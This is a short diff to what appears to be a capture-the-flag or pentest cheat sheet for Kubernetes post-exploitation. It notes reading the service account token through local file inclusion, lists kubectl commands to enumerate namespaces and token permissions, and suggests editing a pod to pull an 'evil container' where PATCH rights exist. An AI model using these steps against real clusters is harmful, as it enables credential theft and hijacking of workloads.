@@ -1,5 +1,16 @@
 LFI /var/run/secrets/kubernetes.io/serviceaccount/token
-kubectl auth can-i --list -n suspicious_namespace
+
+[+] - Listing namespaces:
+    kubectl get namespaces --kubeconfig=config.yaml 
+
+[+] - Listing permissions your serviceaccount token has:
+    [*] - If one of these has "PATCH" permissions, you may be able to modify a POD to pull your evil container using kubectl edit:
+        kubectl auth can-i --list --kubeconfig=config.yaml
+
+
+[+] -If you have a namespace like "flag" or got one from environment variables, try listing their objects:
+    kubectl auth can-i --list -n suspicious_namespace --kubeconfig=config.yaml
+
 
 
 apiVersion: v1
